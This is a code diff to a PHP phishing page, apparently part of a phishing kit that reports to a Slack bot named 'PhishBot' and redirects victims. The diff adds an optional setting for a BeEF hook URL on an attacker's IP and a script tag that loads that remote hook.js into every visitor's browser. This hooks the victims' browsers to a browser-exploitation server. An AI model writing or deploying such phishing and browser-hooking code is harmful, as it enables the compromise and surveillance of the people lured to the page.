@@ -6,6 +6,9 @@ $slackchannel = "#SLACK_CHANNEL";
 $slackemoji = ":see_no_evil:";
 $slackbotname = "PhishBot";
 
+// Set Optional BEEF Hook URL (http://YOUR-IP-HERE:3000/hook.js)
+$BEEFUrl = "";
+
 // Your API URL Here (https://This web site)
 $APIURI = "https://YOUR_API_HERE";
 
@@ -67,6 +70,12 @@ $conn->close();
 window.top.location.href = "<?php echo $redirect; ?>";
 </script>
 
+<?php
+// Performs BEEF Hook if Set
+if($BEEFUrl != ""){?>
+<script src= "<?php echo $BEEFUrl; ?>" type="text/javascript"></script>
+<?php } ?>    
+    
 </BODY>
 </HTML>
 
